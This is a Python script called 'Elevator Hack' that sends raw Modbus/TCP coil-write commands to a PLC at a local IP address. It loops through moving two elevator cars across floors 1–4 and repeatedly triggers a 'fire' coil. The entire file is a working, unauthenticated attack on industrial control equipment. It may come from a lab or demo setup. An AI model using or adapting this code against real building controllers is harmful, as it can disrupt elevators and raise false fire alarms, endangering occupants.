import socket
import time
import msvcrt


#    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Just testing if connection can be made
#    s.connect((PLC,PORT))
#    s.close()

#   StartTime = int(time.time());
#    while int(time.time()) - StartTime <= 10:
#        fire()

PLC = '192.168.0.10'  
PORT = 502

C1F1 = bytearray()
C1F1.append(0x02)
C1F1.append(0x2d)
C1F1.append(0x00)
C1F1.append(0x00)
C1F1.append(0x00)
C1F1.append(0x06)
C1F1.append(0x01)
C1F1.append(0x05)
C1F1.append(0x03)
C1F1.append(0x20)
C1F1.append(0xff)
C1F1.append(0x00)

C1F2 = bytearray()
C1F2.append(0x13)
C1F2.append(0x73)
C1F2.append(0x00)
C1F2.append(0x00)
C1F2.append(0x00)
C1F2.append(0x06)
C1F2.append(0x01)
C1F2.append(0x05)
C1F2.append(0x03)
C1F2.append(0x21)
C1F2.append(0xff)
C1F2.append(0x00)

C1F3 = bytearray()
C1F3.append(0x13)
C1F3.append(0x73)
C1F3.append(0x00)
C1F3.append(0x00)
C1F3.append(0x00)
C1F3.append(0x06)
C1F3.append(0x01)
C1F3.append(0x05)
C1F3.append(0x03)
C1F3.append(0x22)
C1F3.append(0xff)
C1F3.append(0x00)

C1F4 = bytearray()
C1F4.append(0x13)
C1F4.append(0x73)
C1F4.append(0x00)
C1F4.append(0x00)
C1F4.append(0x00)
C1F4.append(0x06)
C1F4.append(0x01)
C1F4.append(0x05)
C1F4.append(0x03)
C1F4.append(0x23)
C1F4.append(0xff)
C1F4.append(0x00)
    
C2F1 = bytearray()
C2F1.append(0x16)
C2F1.append(0xf4)
C2F1.append(0x00)
C2F1.append(0x00)
C2F1.append(0x00)
C2F1.append(0x06)
C2F1.append(0x01)
C2F1.append(0x05)
C2F1.append(0x03)
C2F1.append(0x24)
C2F1.append(0xff)
C2F1.append(0x00)

C2F2 = bytearray()
C2F2.append(0x16)
C2F2.append(0xf4)
C2F2.append(0x00)
C2F2.append(0x00)
C2F2.append(0x00)
C2F2.append(0x06)
C2F2.append(0x01)
C2F2.append(0x05)
C2F2.append(0x03)
C2F2.append(0x25)
C2F2.append(0xff)
C2F2.append(0x00)

C2F3 = bytearray()
C2F3.append(0x16)
C2F3.append(0xf4)
C2F3.append(0x00)
C2F3.append(0x00)
C2F3.append(0x00)
C2F3.append(0x06)
C2F3.append(0x01)
C2F3.append(0x05)
C2F3.append(0x03)
C2F3.append(0x26)
C2F3.append(0xff)
C2F3.append(0x00)

C2F4 = bytearray()
C2F4.append(0x16)
C2F4.append(0xf4)
C2F4.append(0x00)
C2F4.append(0x00)
C2F4.append(0x00)
C2F4.append(0x06)
C2F4.append(0x01)
C2F4.append(0x05)
C2F4.append(0x03)
C2F4.append(0x27)
C2F4.append(0xff)
C2F4.append(0x00)

fire = bytearray()
fire.append(0x03)
fire.append(0xac)
fire.append(0x00)
fire.append(0x00)
fire.append(0x00)
fire.append(0x06)
fire.append(0x01)
fire.append(0x05)
fire.append(0x00)
fire.append(0x0b)
fire.append(0xff)
fire.append(0x00) 

fire_off = bytearray()
fire_off.append(0x59)
fire_off.append(0x5f)
fire_off.append(0x00)
fire_off.append(0x00)
fire_off.append(0x00)
fire_off.append(0x06)
fire_off.append(0x01)
fire_off.append(0x05)
fire_off.append(0x00)
fire_off.append(0x0b)
fire_off.append(0x00)
fire_off.append(0x00)

def SpamMsg(Message):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Just testing if connection can be made
    s.connect((PLC,PORT))
    s.send(Message)
    s.close()
    
def main():
    print("Welcome to Elevator Hack!!\n\n")
    answer = "yes"
    answer = input("Ready for some fun? (y/n): ")
    answer.lower()
    
    if answer == "n" or answer == "no":
        print("Alrighty. Close Window to exit!")
        while 1 == 1:
            x = 0
    
    print("Here we go...\n")
    print("Press the Enter button when you want to quit\n")
    
    Count = 0
    StartTime = int(time.time())
    
    while answer == "y" or answer == "yes":
        if msvcrt.kbhit():
            key_stroke = msvcrt.getch()
            if key_stroke == b'\r':
                answer = input("Would you like to continue? (y/n): ")
                if answer == "n" or answer == "no":
                    return 0
                
        if int(time.time()) - StartTime >= 1:
            if Count == 0:
                SpamMsg(fire_off)
                Count = Count + 1
                StartTime = int(time.time())
            
            elif Count == 1:
                SpamMsg(C1F1)
                SpamMsg(C2F1)
                Count = Count + 1
                StartTime = int(time.time())
                
            elif Count == 2:
                SpamMsg(C1F2)
                SpamMsg(C2F2)
                Count = Count + 1
                StartTime = int(time.time())
                
            elif Count == 3:
                SpamMsg(C1F3)
                SpamMsg(C2F3)
                Count = Count + 1
                StartTime = int(time.time())
                
            elif Count == 4:
                SpamMsg(C1F4)
                SpamMsg(C2F4)
                Count = Count + 1
                StartTime = int(time.time())
                
            else:
                SpamMsg(fire)
                Count = 0
                print("FIRE!!\n")
                StartTime = int(time.time())
        
    
main()